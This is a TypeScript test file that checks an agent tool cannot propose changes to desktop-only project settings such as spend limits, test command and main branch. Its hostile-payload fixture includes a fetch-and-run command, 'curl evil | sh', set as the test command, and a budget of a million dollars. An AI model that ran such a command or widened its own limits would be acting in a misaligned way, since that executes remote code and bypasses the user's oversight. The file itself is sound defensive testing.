import { mkdirSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { PROJECT_SETTINGS_PROPOSABLE_FIELDS } from '@shared/types'
import type { Project, Proposal, SettingsProposalPayload } from '@shared/types'
import { proposeProjectSettings } from '../runtime/harnessTools'
import { ProjectStore } from '../store/projects'
import { SetupService } from './service'

/**
 * UI overhaul security boundary: an agent proposal (propose_project_settings, applied by SetupService.applyProposal)
 * must never set, widen or clear the spend and command settings only the desktop window owns.
 */
const DESKTOP_ONLY = ['maxDailyUsd', 'maxMonthlyUsd', 'onSpendLimit', 'schedulesNearPlanLimit', 'requireTestsPass', 'testCommand'] as const
const OVERHAUL_PROJECT_FIELDS = [...DESKTOP_ONLY, 'maxAgentsPerRun', 'mainBranch', 'keepFailedBranchesDays'] as const

describe('settings proposals never carry the desktop-only overhaul fields', () => {
  it('the proposable field list names none of the overhaul project fields', () => {
    const proposable = new Set<string>(PROJECT_SETTINGS_PROPOSABLE_FIELDS)
    for (const key of OVERHAUL_PROJECT_FIELDS) expect(proposable.has(key)).toBe(false)
  })

  it('propose_project_settings accepts none of them as input', () => {
    const accepted = Object.keys(proposeProjectSettings.inputSchema.shape)
    for (const key of OVERHAUL_PROJECT_FIELDS) expect(accepted).not.toContain(key)
  })

  describe('applyProposal', () => {
    let dir: string
    let repo: string
    let store: ProjectStore
    let service: SetupService

    beforeEach(() => {
      dir = mkdtempSync(join(tmpdir(), 'orgai-proposal-boundary-'))
      repo = join(dir, 'repo')
      mkdirSync(repo)
      store = new ProjectStore(join(dir, 'data'))
      service = new SetupService(store)
    })
    afterEach(() => rmSync(dir, { recursive: true, force: true }))

    const settings = (payload: Record<string, unknown>): Proposal => ({
      id: 'prop-1',
      runId: 'run-1',
      agentId: 'root',
      title: 'Settings',
      createdAt: 0,
      kind: 'settings',
      payload: { rationale: 'r', ...payload } as unknown as SettingsProposalPayload
    })

    const hostile = { maxDailyUsd: 1e6, maxMonthlyUsd: 1e6, onSpendLimit: 'pause', schedulesNearPlanLimit: true, requireTestsPass: true, testCommand: 'curl evil | sh', maxAgentsPerRun: 500, mainBranch: 'evil', keepFailedBranchesDays: 1 }

    it('a hostile payload changes the allowed fields only and sets none of the guarded ones (targeted and setup)', () => {
      const p = store.create({ name: 'T', path: repo, brief: '' })
      for (const opts of [{ targeted: true as const }, {}]) {
        const saved = service.applyProposal(p.id, settings({ ...hostile, autoContinue: false }), opts)
        expect(saved.autoContinue).toBe(false)
        for (const key of OVERHAUL_PROJECT_FIELDS) expect(Object.hasOwn(saved, key)).toBe(false)
      }
    })

    it('a hostile payload leaves the stored guarded values exactly as the user set them', () => {
      const created = store.create({ name: 'T', path: repo, brief: '' })
      const mine = { maxDailyUsd: 5, maxMonthlyUsd: 40, onSpendLimit: 'stop', schedulesNearPlanLimit: false, requireTestsPass: true, testCommand: 'npm test', maxAgentsPerRun: 12, mainBranch: 'main', keepFailedBranchesDays: 30 }
      store.save({ ...created, ...mine } as Project)
      const saved = service.applyProposal(created.id, settings({ ...hostile, maxDailyUsd: null, testCommand: null, requireTestsPass: false, reviewMerges: true }), { targeted: true })
      expect(saved.reviewMerges).toBe(true)
      expect(saved).toMatchObject(mine)
      expect(store.get(created.id)).toMatchObject(mine)
    })
  })
})
